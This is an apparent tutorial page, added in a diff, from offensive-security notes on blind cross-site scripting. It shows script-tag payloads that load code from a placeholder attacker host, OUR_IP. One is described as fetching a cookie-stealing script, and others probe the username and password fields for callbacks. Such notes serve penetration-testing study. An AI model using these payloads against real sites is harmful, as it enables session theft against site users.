@@ -1,0 +1,28 @@
+# Blind XSS
+
+In Blind XSS, we CANNOT see what our malicious input outputted depending on the payload (like an alert box), and if there are multiple input fields, we may not know which one is vulnerable.
+
+To solve this, we can use a remote script hosted on our machine and change the script name (script.js) to input field names one by one to see which one is vulnerable.
+
+First we need to identify a working XSS payload that can load a remote script ( [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#blind-xss)).
+
+Basic Example Payload
+
+Copy
+
+```
+<script src="http://OUR_IP/script.js"></script> # Executing this will call a malicious cookie stealing script from our machine but,
+```
+
+Then we will start a server on our machine and then execute the below payloads to test which field is vulnerable. If we get a callback it means that field is vulnerable.
+
+Copy
+
+```
+<script src="http://OUR_IP/username"></script> # Testing to see if the username input field is vulnerable
+<script src="http://OUR_IP/password"></script> # Testing to see if the password input field is vulnerable
+```
+
+[PreviousDOM XSS](security/offensive-security/web-applications/web-exploitation/xss/dom-xss.md) [NextSession Hijacking](security/offensive-security/web-applications/web-exploitation/xss/session-hijacking.md)
+
+Last updated 3 days ago
